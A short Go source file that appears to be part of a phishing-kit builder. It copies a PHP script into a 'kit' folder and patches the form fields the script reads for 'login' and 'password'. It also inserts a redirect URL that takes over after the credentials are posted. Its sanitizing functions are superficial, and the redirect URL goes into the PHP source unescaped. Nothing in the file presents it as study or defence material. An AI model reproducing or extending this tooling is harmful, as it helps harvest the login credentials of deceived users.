package main

import (
	"bytes"
	"html"
	"os"
	"path"
	"path/filepath"
	"regexp"
)

// sanitizeFilename sanitizes the filename to prevent path injection.
func sanitizeFilename(filename string) string {
	// Remove any path separators and other potentially dangerous characters
	re := regexp.MustCompile(`[<>:"/\\|?*]`)
	return re.ReplaceAllString(filename, "")
}

// sanitizePath sanitizes the path to prevent path injection.
func sanitizePath(p string) string {
	// Clean the path and ensure it is relative
	return filepath.Clean(p)
}

// copyPhpToKit copies the PHP file to the destination folder.
func copyPhpToKit(phpFilename string, destFolder string) error {
	phpFilename = sanitizeFilename(phpFilename)
	destFolder = sanitizePath(destFolder)

	phpFile, err := os.ReadFile(phpFilename)
	if err != nil {
		return err
	}
	destPath := path.Join(destFolder, phpFilename)
	return os.WriteFile(destPath, phpFile, 0644)
}

// patchPhp patches the PHP file with URL redirection and correct attribute names for credentials.
func patchPhp(phpPath string, postLogin string, postPassword string, urlin string) error {
	phpPath = sanitizePath(phpPath)

	contents, err := os.ReadFile(phpPath)
	if err != nil {
		return err
	}

	// Escape and replace login attribute if necessary
	if postLogin != "login" {
		postLogin = html.EscapeString(postLogin)
		contents = bytes.ReplaceAll(contents, []byte("$parsed['login']"), []byte("$parsed['"+postLogin+"']"))
	}

	// Escape and replace password attribute if necessary
	if postPassword != "password" {
		postPassword = html.EscapeString(postPassword)
		contents = bytes.ReplaceAll(contents, []byte("$parsed['password']"), []byte("$parsed['"+postPassword+"']"))
	}

	// Replace URL redirection
	contents = bytes.ReplaceAll(contents, []byte("header('Location: \"\"');"), []byte("header('Location: "+urlin+"');"))

	return os.WriteFile(phpPath, contents, 0644)
}
